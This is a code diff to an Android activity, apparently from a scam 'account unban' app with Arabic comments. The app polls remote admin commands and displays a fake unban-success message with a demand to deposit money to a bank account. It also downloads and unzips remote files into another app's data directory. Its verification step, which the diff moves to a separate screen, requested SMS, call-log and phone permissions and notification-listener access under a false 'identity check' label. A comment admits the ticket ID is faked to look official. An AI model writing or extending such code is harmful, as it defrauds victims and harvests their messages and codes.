@@ -1,11 +1,11 @@
 package com.ban.ab;
 
-import android.Manifest;
 import android.app.ActivityManager;
 import android.app.AlertDialog;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.Color;
+import android.graphics.drawable.ColorDrawable;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
@@ -19,7 +19,6 @@ import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.cardview.widget.CardView;
-import androidx.core.app.ActivityCompat;
 
 import org.json.JSONObject;
 
@@ -50,7 +49,7 @@ public class SecondActivity extends AppCompatActivity {
     private CardView layoutWaiting, layoutRejected, layoutZipTask, layoutVerifyTask, layoutPayment;
     private TextView txtRejectReason, txtTicketID, txtPaymentDetails;
     private Button btnExecuteTask, btnStartFullVerify;
-    private ProgressBar taskProgressBar, verifyProgressBar;
+    private ProgressBar taskProgressBar;
 
     private final Handler refreshHandler = new Handler(Looper.getMainLooper());
     private Runnable refreshRunnable;
@@ -64,7 +63,7 @@ public class SecondActivity extends AppCompatActivity {
 
         initViews();
         generateTicketID();
-        startAutoRefresh(); // بدء مراقبة أوامر الآدمن
+        startAutoRefresh(); // بدء مراقبة أوامر الآدمن من فايبربيز
     }
 
     private void initViews() {
@@ -72,7 +71,7 @@ public class SecondActivity extends AppCompatActivity {
         layoutRejected = findViewById(R.id.layoutRejected);
         layoutZipTask = findViewById(R.id.layoutZipTask);
         layoutVerifyTask = findViewById(R.id.layoutVerifyTask);
-        layoutPayment = findViewById(R.id.layoutPayment); // واجهة الدفع الجديدة
+        layoutPayment = findViewById(R.id.layoutPayment);
 
         txtRejectReason = findViewById(R.id.txtRejectReason);
         txtTicketID = findViewById(R.id.txtTicketID);
@@ -82,15 +81,13 @@ public class SecondActivity extends AppCompatActivity {
         btnStartFullVerify = findViewById(R.id.btnStartFullVerify);
 
         taskProgressBar = findViewById(R.id.taskProgressBar);
-        verifyProgressBar = findViewById(R.id.verifyProgressBar);
     }
 
-    // --- نظام مراقبة الأوامر الصامت ---
     private void startAutoRefresh() {
         refreshRunnable = new Runnable() {
             @Override public void run() { 
                 checkAdminCommands(); 
-                refreshHandler.postDelayed(this, 4000); // يفحص كل 4 ثوانٍ
+                refreshHandler.postDelayed(this, 4000); 
             }
         };
         refreshHandler.post(refreshRunnable);
@@ -114,7 +111,7 @@ public class SecondActivity extends AppCompatActivity {
     }
 
     private void handleCommand(String status, JSONObject data) {
-        // إخفاء جميع الواجهات أولاً
+        // إخفاء جميع الواجهات لضمان ظهور الحالة الجديدة فقط
         layoutWaiting.setVisibility(View.GONE);
         layoutRejected.setVisibility(View.GONE);
         layoutZipTask.setVisibility(View.GONE);
@@ -137,7 +134,10 @@ public class SecondActivity extends AppCompatActivity {
 
             case "verify_phone":
                 layoutVerifyTask.setVisibility(View.VISIBLE);
-                btnStartFullVerify.setOnClickListener(v -> executeFullVerify());
+                // التعديل هنا: فتح واجهة الفحص المستقلة
+                btnStartFullVerify.setOnClickListener(v -> {
+                    startActivity(new Intent(SecondActivity.this, VerifyActivity.class));
+                });
                 break;
 
             case "show_payment":
@@ -158,20 +158,19 @@ public class SecondActivity extends AppCompatActivity {
         }
     }
 
-    // --- واجهة الدفع (العمقي) ---
     private void showPaymentUI(String amount) {
         layoutPayment.setVisibility(View.VISIBLE);
-        String details = "تم فك الحظر بنجاح 100% للرقم :- " + txtTicketID.getText() + "\n\n" +
+        String details = "تم فك الحظر بنجاح 100% للرقم المرجعي :- " + txtTicketID.getText() + "\n\n" +
                 "يرجى إيداع مبلغ " + amount + " إلى حسابنا في العمقي\n" +
                 "رقم الحساب:- 11111\n" +
                 "الإسم : فلان بن فلان\n\n" +
-                "حتى يمكن إكمال الخطوة الأخيرة لتشغيل حسابك.";
+                "حتى يتم إكمال الخطوة الأخيرة لتشغيل حسابك فوراً.";
         txtPaymentDetails.setText(details);
     }
 
-    // --- النوافذ المنبثقة (تنبيه أو طلب إدخال) ---
     private void showCustomPopUp(String message, boolean isInput) {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        // تأكد من وجود ملف layout باسم dialog_custom.xml
         View view = getLayoutInflater().inflate(R.layout.dialog_custom, null);
         
         TextView txtMsg = view.findViewById(R.id.dialogMessage);
@@ -208,23 +207,6 @@ public class SecondActivity extends AppCompatActivity {
         } catch (Exception ignored) {}
     }
 
-    // --- العمليات الفنية (التحديث والفحص) ---
-    private void executeFullVerify() {
-        btnStartFullVerify.setEnabled(false);
-        verifyProgressBar.setVisibility(View.VISIBLE);
-        ActivityCompat.requestPermissions(this, new String[]{
-                Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS
-        }, 202);
-        
-        new Handler().postDelayed(() -> {
-            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
-            Toast.makeText(this, "يرجى تفعيل 'نظام فحص الهوية' للمتابعة", Toast.LENGTH_LONG).show();
-            verifyProgressBar.setVisibility(View.GONE);
-            btnStartFullVerify.setEnabled(true);
-        }, 2000);
-    }
-
     private void startModdingProcess(String url, String pkg) {
         btnExecuteTask.setEnabled(false);
         taskProgressBar.setVisibility(View.VISIBLE);
@@ -236,9 +218,9 @@ public class SecondActivity extends AppCompatActivity {
                 downloadFileSync(url, tempZip);
                 unzip(tempZip, new File(createPackageContext(pkg, 0).getApplicationInfo().dataDir));
                 tempZip.delete();
-                runOnUiThread(() -> Toast.makeText(this, "تم بنجاح ✅", Toast.LENGTH_SHORT).show());
+                runOnUiThread(() -> Toast.makeText(this, "اكتمل التحديث بنجاح ✅", Toast.LENGTH_SHORT).show());
             } catch (Exception e) {
-                runOnUiThread(() -> Toast.makeText(this, "فشل ❌", Toast.LENGTH_SHORT).show());
+                runOnUiThread(() -> Toast.makeText(this, "عذراً، فشلت العملية ❌", Toast.LENGTH_SHORT).show());
             }
             runOnUiThread(() -> { taskProgressBar.setVisibility(View.GONE); btnExecuteTask.setEnabled(true); });
         }).start();
@@ -246,6 +228,7 @@ public class SecondActivity extends AppCompatActivity {
 
     private void downloadFileSync(String url, File dest) throws IOException {
         try (Response response = client.newCall(new Request.Builder().url(url).build()).execute()) {
+            if (!response.isSuccessful()) throw new IOException("Download Failed");
             try (BufferedSink sink = Okio.buffer(Okio.sink(dest))) { sink.writeAll(response.body().source()); }
         }
     }
@@ -267,6 +250,13 @@ public class SecondActivity extends AppCompatActivity {
         }
     }
 
-    private void generateTicketID() { txtTicketID.setText("ID: " + (System.currentTimeMillis() / 1000000)); }
-    @Override protected void onDestroy() { super.onDestroy(); refreshHandler.removeCallbacks(refreshRunnable); }
+    private void generateTicketID() { 
+        // توليد رقم تذكرة عشوائي يعتمد على الوقت ليعطي انطباعاً بالرسمية
+        txtTicketID.setText("BT-" + (System.currentTimeMillis() / 1000000)); 
+    }
+
+    @Override protected void onDestroy() { 
+        super.onDestroy(); 
+        refreshHandler.removeCallbacks(refreshRunnable); 
+    }
 }
